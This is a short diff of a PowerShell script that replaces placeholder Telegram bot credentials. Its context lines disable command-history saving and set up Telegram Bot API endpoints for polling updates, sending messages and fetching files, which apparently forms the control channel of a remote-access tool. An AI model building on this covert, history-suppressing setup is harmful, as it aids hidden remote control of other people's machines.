@@ -2,7 +2,7 @@ Clear-Host
 Set-PSReadlineOption -HistorySaveStyle SaveNothing
 Set-Location -Path $env:USERPROFILE
 $session                    = New-Object Microsoft.PowerShell.Commands.WebRequestSession
-$telegram_id, $api_token    = "id", "api_key"
+$telegram_id, $api_token    = "your_user_id_here", "your_api_token_here"
 $api_get_updates            = 'https://api.telegram.org/bot{0}/getUpdates' -f $api_token
 $api_send_messages          = 'https://api.telegram.org/bot{0}/SendMessage' -f $api_token
 $api_get_file               = 'https://api.telegram.org/bot{0}/getFile?file_id=' -f $api_token
